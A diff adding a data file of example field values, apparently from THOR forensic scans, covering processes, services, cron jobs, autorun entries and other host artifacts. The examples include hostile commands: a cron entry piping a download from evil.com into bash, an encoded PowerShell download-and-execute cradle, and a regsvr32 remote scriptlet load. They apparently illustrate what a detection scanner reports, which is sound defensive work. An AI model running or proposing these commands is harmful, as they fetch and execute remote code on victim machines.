@@ -1,0 +1,86 @@
+# Example values collected from THOR scans on Fedora Linux 43
+# Format: object_type -> field_name -> list of example values
+
+process:
+  pid: ['1', '214681', '2801945']
+  name: ['stub-server', 'thunderstorm-stub-server', 'bash', 'systemd']
+  command: ['/usr/lib/systemd/systemd --switched-root --system --deserialize=58', '/tmp/stub-server -port 19992 -tls-generate', '/usr/bin/python3 -m http.server 19993']
+  owner: ['root', 'neo', 'sssd']
+  session: ['', 'neo']
+  created: ['2026-02-25T20:03:04+01:00', '2026-04-26T11:55:48+02:00']
+  image.path: ['/usr/bin/systemd', '/tmp/stub-server (deleted)', '/usr/bin/python3']
+  image.exists: ['yes', 'no']
+  image.extension: ['', 'exe']
+  image.magic_header: ['ELF', 'PE32']
+  image.size: ['1502072', '9670012']
+  parent_info.pid: ['1', '2800578']
+  parent_info.exe: ['/usr/lib/systemd/systemd', '/usr/bin/node']
+  listen_ports: ['22', '80', '443']
+  dead: ['false', 'true']
+
+unix user:
+  name: ['root', 'neo', 'sssd', 'nobody']
+  uid: ['0', '1000', '996', '65534']
+  gid: ['0', '1000', '990']
+  shell: ['/bin/bash', '/usr/sbin/nologin', '/bin/false']
+  home: ['/root', '/home/neo', '/']
+  full_name: ['root', 'neo', 'System User']
+  crontab: ['', '/var/spool/cron/neo']
+  type: ['unix user']
+
+systemd service:
+  name: ['sshd.service', 'ollama.service', 'aurora-agent.service']
+  command: ['/usr/sbin/sshd -D', '/usr/local/bin/ollama serve', 'bash -c exec /opt/aurora-linux/aurora']
+  run_as_user: ['root', 'ollama', '']
+  run_as_group: ['root', 'ollama', '']
+  type: ['systemd service']
+  wanted_by: ['multi-user.target', 'default.target']
+  after: ['network.target', 'syslog.target']
+  restart: ['always', 'no', 'on-failure']
+  enabled: ['true', 'false']
+
+file:
+  path: ['/etc/passwd', '/etc/shadow', '/tmp/malware.sh']
+  name: ['passwd', 'shadow', 'malware.sh']
+  type: ['file']
+  size: ['1234', '0', '1048576']
+  exists: ['yes', 'no']
+  extension: ['', 'sh', 'exe', 'dll']
+  magic_header: ['ASCII text', 'ELF', 'PE32', 'MZ']
+  hashes.md5: ['d41d8cd98f00b204e9800998ecf8427e', '5f4dcc3b5aa765d61d8327deb882cf99']
+  hashes.sha1: ['da39a3ee5e6b4b0d3255bfef95601890afd80709']
+  hashes.sha256: ['e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855']
+  permissions.type: ['Unix permissions', 'Windows permissions']
+  permissions.owner: ['root', 'neo', 'SYSTEM']
+
+linux kernel module:
+  name: ['nf_conntrack', 'nvme', 'hid_generic', 'sysbeacon']
+  file: ['/lib/modules/6.18.6-200.fc43.x86_64/kernel/net/netfilter/nf_conntrack.ko.xz', 'null']
+  included_in_kernel: ['true', 'false']
+  size: ['123456', '0']
+  dependencies: ['', 'nvme-core']
+  type: ['linux kernel module']
+
+cron job:
+  command: ['/usr/bin/certbot renew', 'curl -s http://evil.com/payload | bash', '/opt/backup.sh']
+  user: ['root', 'neo']
+  schedule: ['0 2 * * *', '*/5 * * * *', '@daily']
+  file: ['/etc/crontab', '/var/spool/cron/neo']
+  type: ['cron job']
+
+hosts file entry:
+  ip: ['127.0.0.1', '192.168.1.100', '0.0.0.0']
+  hostname: ['localhost', 'evil.com', 'google.com']
+  type: ['hosts file entry']
+
+authorized_keys entry:
+  key: ['ssh-rsa AAAAB3NzaC1yc2E...', 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...']
+  type: ['ssh-rsa', 'ssh-ed25519', 'ecdsa-sha2-nistp256']
+  comment: ['user@laptop', 'florian@desktop', 'backup-key']
+  file: ['/home/neo/.ssh/authorized_keys', '/root/.ssh/authorized_keys']
+  type_entry: ['authorized_keys entry']
+
+autorun entry:
+  launch_string: ['C:\\Windows\\System32\\svchost.exe -k netsvcs', 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBwAHMAMQAnACkA', 'regsvr32 /s /n /i:http://evil.com/payload.sct scrobj.dll']
+  location: ['HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'C:\\Users\\neo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup']
+  type: ['autorun entry']
